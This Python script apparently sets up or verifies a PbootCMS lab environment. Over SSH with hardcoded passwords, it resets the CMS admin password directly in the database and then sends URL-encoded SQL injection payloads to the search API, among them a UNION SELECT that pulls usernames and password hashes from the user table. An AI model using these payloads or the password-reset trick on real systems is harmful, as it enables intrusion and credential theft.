#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Final A1 fixes: encrypt_string, clear cache, test SQLi with URL encoding"""
import paramiko
import sys
import urllib.parse

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

user = 'gdadmin'
pwd = 'Gdadmin@123'
cms_user = 'cmsuser'
cms_pass = 'Cm5Us3r@2024!'

def run(ssh, cmd, timeout=30):
    print(f">>> {cmd[:150]}")
    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode('utf-8', errors='replace')
    err = stderr.read().decode('utf-8', errors='replace')
    ec = stdout.channel.recv_exit_status()
    if out.strip():
        try:
            print(f"  {out.strip()[:2000]}")
        except:
            print(f"  [output {len(out.strip())} chars]")
    if err.strip() and ec != 0:
        try:
            print(f"  [err] {err.strip()[:300]}")
        except:
            print(f"  [err suppressed]")
    return out, err, ec

c1 = paramiko.SSHClient()
c1.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c1.connect('192.168.100.1', username=user, password=pwd, timeout=10)

c2 = paramiko.SSHClient()
c2.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c2.connect('192.168.100.2', username=user, password=pwd, timeout=10)

# ============================================================
# 1. Read encrypt_string function
# ============================================================
print("="*60)
print("1. encrypt_string FUNCTION")
print("="*60)
run(c1, "sed -n '430,460p' /var/www/cms/core/function/handle.php")

# ============================================================
# 2. Clear PbootCMS runtime cache
# ============================================================
print("\n" + "="*60)
print("2. CLEAR PBOOTCMS CACHE")
print("="*60)
# PbootCMS caches config in /var/www/cms/runtime/
run(c1, "ls -la /var/www/cms/runtime/ 2>/dev/null || echo 'no runtime dir'")
run(c1, "find /var/www/cms -name 'runtime' -type d 2>/dev/null")
# Clear PHP opcache
run(c1, "echo 'Gdadmin@123' | sudo -S systemctl restart apache2 2>&1; echo RESTART_EXIT:$?")
# Wait a moment
run(c1, "sleep 2; echo OK")

# ============================================================
# 3. Test API with restart (config should be re-read)
# ============================================================
print("\n" + "="*60)
print("3. TEST API AFTER RESTART")
print("="*60)
run(c1, "curl -s 'http://localhost/api.php/search?keyword=test' 2>&1")
run(c1, "curl -s \"http://localhost/api.php/search?keyword=test%27\" 2>&1")

# ============================================================
# 4. Generate correct password hash using PHP on A1
# ============================================================
print("\n" + "="*60)
print("4. GENERATE CORRECT PASSWORD HASH")
print("="*60)
# Run PHP to compute encrypt_string('admin123')
php_code = """
<?php
require_once '/var/www/cms/core/function/handle.php';
echo encrypt_string('admin123');
"""
run(c1, f"php -r \"{php_code}\" 2>&1")

# Also try simpler: just run a PHP script that includes the file
run(c1, "cat > /tmp/genpass.php << 'PHPEOF'\n<?php\nrequire_once '/var/www/cms/core/function/handle.php';\necho encrypt_string('admin123') . \"\\n\";\nPHPEOF")
run(c1, "php /tmp/genpass.php 2>&1")

# ============================================================
# 5. Update admin password in database
# ============================================================
print("\n" + "="*60)
print("5. UPDATE ADMIN PASSWORD")
print("="*60)
# Get the hash from PHP output (from above), then update DB
# We'll do it all in one shot
run(c1, "php /tmp/genpass.php > /tmp/admin_hash.txt 2>&1; cat /tmp/admin_hash.txt")

# Read hash and update DB
out, _, _ = run(c1, "cat /tmp/admin_hash.txt 2>&1")
admin_hash = out.strip().split('\n')[-1] if out.strip() else ''
print(f"  Admin hash: {admin_hash}")

if admin_hash:
    run(c2, f"mysql -u {cms_user} -p'{cms_pass}' -h localhost -e \"UPDATE cms.ay_user SET password='{admin_hash}' WHERE username='admin';\" 2>&1")
    run(c2, f"mysql -u {cms_user} -p'{cms_pass}' -h localhost -e 'SELECT id,username,password FROM cms.ay_user WHERE username=\"admin\";' 2>&1")

# ============================================================
# 6. Test login with correct password
# ============================================================
print("\n" + "="*60)
print("6. TEST ADMIN LOGIN")
print("="*60)
# Get fresh formcheck
run(c1, "curl -s -c /tmp/cjar http://localhost/admin.php 2>&1 | grep -oP 'name=\"formcheck\"[^>]+value=\"[^\"]+' | grep -oP 'value=\"[^\"]+' | cut -d'\"' -f2")

# Get the formcheck value
out, _, _ = run(c1, "curl -s -b /tmp/cjar http://localhost/admin.php 2>&1 | grep -oP 'value=\"[a-f0-9]{32}\"' | head -1")
formcheck = out.strip().replace('value="', '').replace('"', '') if out else ''
print(f"  formcheck: {formcheck}")

if formcheck:
    # Login
    run(c1, f"curl -s -X POST 'http://localhost/admin.php?p=/Index/login' -b /tmp/cjar -d 'username=admin&password=admin123&formcheck={formcheck}' -D - 2>&1 | head -15")
    # After login, check if we can access dashboard
    run(c1, "curl -s -b /tmp/cjar 'http://localhost/admin.php?p=/Index/home' 2>&1 | head -20")

# ============================================================
# 7. Test SQLi with URL encoding
# ============================================================
print("\n" + "="*60)
print("7. SQLi URL-ENCODED TESTS")
print("="*60)
# Use --data-urlencode via curl, or manually encode
payloads = [
    "keyword=test'",
    "keyword=test' AND 1=1-- ",
    "keyword=test' UNION SELECT 1,2,3,4-- ",
    "keyword=test' UNION SELECT 1,username,password,4 FROM ay_user-- ",
]
import subprocess
for pl in payloads:
    encoded = urllib.parse.quote(pl, safe='=&')
    run(c1, f"curl -s 'http://localhost/api.php/search?{encoded}' 2>&1")
    print("---")

c1.close()
c2.close()
print("\nDone!")
